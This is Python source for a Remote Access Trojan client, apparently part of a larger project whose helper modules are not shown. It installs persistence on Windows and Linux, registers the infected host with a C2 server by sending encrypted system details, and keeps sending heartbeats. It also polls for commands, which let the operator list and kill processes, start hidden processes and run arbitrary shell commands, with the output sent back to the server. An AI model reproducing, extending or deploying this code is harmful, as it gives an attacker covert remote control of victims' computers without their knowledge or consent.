import requests
import time
import platform
import socket
from client_identity_manager import ClientIdentityManager
from config import HOST, ENCRYPTION_KEY
from encryptor import Encryptor
from persistence import PersistenceManager
from protocol import Protocol
from process_manager import ProcessManager




class RATClient:
    def __init__(self):
        #self.client_id = str(uuid.uuid4())
        self.id_manager = ClientIdentityManager()
        self.persistence = PersistenceManager()
        self.process_manager = ProcessManager()


        self.client_id = self.id_manager._get_persistent_client_id()
        self.server_url = HOST
        self.registered = False
        self.encryptor = Encryptor(ENCRYPTION_KEY)
                



    
    def get_system_info(self):
        try:
            hostname = socket.gethostname()
            return {
                "platform": self.persistence.platform,
                "platform_version": platform.version(),
                "hostname": hostname,
                "architecture": platform.architecture()[0],
                "processor": platform.processor(),
                "username": platform.node(),
                "persistence info": self.persistence.check_persistence(),
                "python_version": platform.python_version()
            }
        except Exception as e:
            print(f"[-] Error getting system info: {e}")
            return {"platform": "Unknown", "hostname": "Unknown"}
    
    
    def register(self):
        try:
            system_info = self.get_system_info()
            
            registration_msg = Protocol.create_register_message(
                client_id=self.client_id,
                system_info=system_info
            )

            encrypted_data = self.encryptor.encrypt(registration_msg)
            if not encrypted_data:
                return False
            
            print(f"[+] Attempting to register with C2 server...")
            
            response = requests.post(
                f"{self.server_url}/register",
                json={"data": encrypted_data},
                headers={'Content-Type': 'application/json'},
                timeout=10
            )

            
            if response.status_code == 200:
                response_data = response.json()
                decrypted_response = self.encryptor.decrypt(response_data.get('data'))

                if decrypted_response and decrypted_response.get('type') == 'success':
                    self.registered = True
                    print(f"[+] ✅ Successfully registered with C2 server!")
                    return True
            
            print(f"[-] ❌ Registration failed: {response.status_code}")
            return False
                

        except requests.exceptions.ConnectionError:
            print(f"[-] ❌ Cannot connect to C2 server at {self.server_url}")
            return False

        except Exception as e:
            print(f"[-] ❌ Registration error: {e}")
            return False
    
    
    def send_heartbeat(self):
        try:
            heartbeat_msg = Protocol.create_heartbeat_message(
                self.client_id,
                extra_data={"persistence_activity": self.persistence.check_persistence()}
            )

            encrypted_data = self.encryptor.encrypt(heartbeat_msg)
            
            if not encrypted_data:
                return False


            response = requests.post(
                f"{self.server_url}/heartbeat",
                json={"data": encrypted_data},
                timeout=5
            )
            
            #return response.status_code == 200
            if response.status_code == 200:
                response_data = response.json()
                decrypted_res = self.encryptor.decrypt(response_data.get('data'))
                return decrypted_res and decrypted_res.get("type") == 'success'
            
            return False
            
        except Exception as e:
            return False


    def handle_process_command(self, command_data):
        try:
            action = command_data.get('action')
            data = command_data.get('data', {})
            
            if action == "get_all_processes":
                result = self.process_manager.get_all_processes(detailed=True)
            elif action == "get_process_tree":
                result = self.process_manager.get_process_tree()
            elif action == "get_process_details":
                result = self.process_manager.get_process_details(data.get('pid'))
            elif action == "kill_process":
                result = self.process_manager.kill_process(data.get('pid'))
            elif action == "start_process":
                result = self.process_manager.start_process(
                    data.get('command'), 
                    data.get('hidden', False)
                )
            elif action == "execute_command":
                result = self.process_manager.execute_command(
                    data.get('command'),
                    data.get('hidden', False),
                    data.get('working_dir')
                )
            elif action == "get_system_info":
                result = self.process_manager.get_system_info()
            else:
                result = {"error": f"Unknown process action: {action}"}
            
            return result
        except Exception as e:
            return {"error": f"Process command failed: {e}"}
    
    
    def poll_commands(self):
        try: 
            get_commands_msg = Protocol.create_get_commands_message(self.client_id)
            encrypted_data = self.encryptor.encrypt(get_commands_msg)
            
            if not encrypted_data:
                return
            
            print(f"[DEBUG] Polling for commands from {self.server_url}/commands")
            response = requests.post(
                f'{self.server_url}/commands',
                json={"data": encrypted_data},
                timeout = 30
            )
            print(f"[DEBUG] Command poll response: {response.status_code}")
            
            
            print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
            
            
            if response.status_code == 200:
                response_data = response.json()
                decrypted_response = self.encryptor.decrypt(response_data.get('data'))

                print(f"[DEBUG] Client polling for commands. Response status: {response.status_code}")
                if decrypted_response and decrypted_response.get("type") == "commands":
                    commands = decrypted_response.get("commands", [])
                    for command in commands:
                        print(f"[DEBUG] Executing command: {command.get('action')}")
                        self.execute_command(command)

                else:
                    print(f"[DEBUG] No commands or invalid response: {decrypted_response}")
            
            else:
                print(f"[DEBUG] Command poll failed: {response.status_code} - {response.text}")
        
        except Exception as e:
            print(f"[-] Error polling commands: {e}")
 
    
    def execute_command(self, command):
        try:
            command_id = command.get('command_id')
            action = command.get("action")
            data = command.get("data", {})
            
            print(f"[CLIENT] Executing command {command_id}: {action}")
            
            
            
            result = self.handle_process_command({
                "action": action,
                "data": data
            })
            print(f"[CLIENT] Command {command_id} result: {type(result)}, size: {len(str(result)) if result else 0}")
            
            
            result_msg = Protocol.create_command_result_message(self.client_id, command_id, result)
            
            encrypted_result = self.encryptor.encrypt(result_msg)
            if encrypted_result:
                print(f"[CLIENT] Submitting result for command {command_id}")
                response = requests.post(
                    f"{self.server_url}/commands_result",
                    json={"data": encrypted_result},
                    timeout=10
                )
                print(f"[CLIENT] Result submission response: {response.status_code}")
                if response.status_code != 200:
                    print(f"[CLIENT] Result submission failed: {response.text}")
            else:
                print(f"[CLIENT] Failed to encrypt result")
        
        
        except Exception as e:
            pass





    def start(self):
        print(f"[+] C2 Server: {self.server_url}")

        if self.persistence.platform in ["Windows", "Linux"]:
            self.persistence.install_persistence()
        else:
            print(f"[!] Persistence not supported on {self.persistence.platform}")
        
        #Initial registration
        if not self.register():
            print("[-] Initial registration failed, retrying in 30 seconds...")
            time.sleep(30)
            return self.start()
        


        heartbeat_count = 0
        command_poll_count = 0
        while True:
            try:
                if heartbeat_count % 6 == 0:  #Every 60 seconds
                    print(f"[+] Heartbeat #{heartbeat_count} - Client active: {self.client_id}")
                
                if not self.send_heartbeat():
                    print("[-] Heartbeat failed, attempting re-registration...")
                    self.registered = False
                    self.register()
                
                if command_poll_count % 3 == 0:
                    self.poll_commands()
                    
                heartbeat_count += 1
                command_poll_count += 1
                time.sleep(10)  #Check every 10 seconds
                
            except KeyboardInterrupt:
                print("\n[!] Client stopped by user")
                break
            except Exception as e:
                print(f"[-] Error in main loop: {e}")
                time.sleep(30)



if __name__ == "__main__":
    client = RATClient()
    client.start()